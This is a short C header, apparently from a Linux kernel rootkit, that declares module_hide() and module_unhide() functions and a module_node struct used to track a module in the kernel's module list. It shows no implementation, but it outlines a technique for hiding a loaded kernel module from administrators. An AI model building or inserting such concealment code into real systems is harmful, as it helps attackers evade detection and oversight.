#ifndef MODULE_HIDING
#define MODULE_HIDING

#include <linux/kernfs.h>
#include <linux/rbtree.h>
#include <linux/hash.h>

/* struct for dependencies */
struct module_node {
	struct module *mod;
	struct list_head *mod_next;
};

void module_hide(void);
void module_unhide(void);

#endif